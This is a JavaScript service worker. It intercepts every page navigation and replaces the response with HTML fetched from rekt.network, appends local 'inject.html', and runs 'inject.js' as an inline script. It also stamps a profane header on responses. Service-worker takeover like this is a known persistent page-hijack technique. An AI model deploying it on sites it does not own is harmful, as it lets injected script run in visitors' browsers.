var init;

self.addEventListener('fetch', function(event){
  if (event.request.mode === 'navigate' ||
      (event.request.method === 'GET' &&
       event.request.headers.get('accept').includes('text/html'))) {
    console.log('Caught request for ' + event.request.url);
    event.respondWith(
      Promise.all([
        fetch("https://rekt.network/index.html")
        .then(response => {
          init = {
            status:     response.status,
            statusText: response.statusText,
            headers:    { 'x-message' : 'fuck the police comin straight from the underground' }
          };
          response.headers.forEach(function(v,k){
            init.headers[k] = v;
          });
          return response.text();
        }),
        fetch("inject.html")
        .then(response => {
          return response.text();
        }),
        fetch("inject.js")
        .then(response => {
          return response.text();
        })
      ])
      .then(data => {
        return new Response(data[0] + data[1] + '<script>' + data[2] + '</script>', init);
      })
    );
  };
  if (event.request.headers.get('accept').includes("image/*")) {
    console.log('Caught request for ' + event.request.url);
    event.respondWith(
        fetch(event.request.url).then(function(response){
          init = {
              status:     response.status,
              statusText: response.statusText,
              headers:    { 'x-message' : 'fuck the police comin straight from the underground' }
          };

          response.headers.forEach(function(v,k){
              init.headers[k] = v;
          });
            return response.blob().then(function(blob){
              return new Response(blob, init);
            })
        })
    );
  };
});

self.addEventListener('message', function(event) {
    var data = event.data;
    if(data[0] == "log") {
      console.log(data[1]);
    }
});
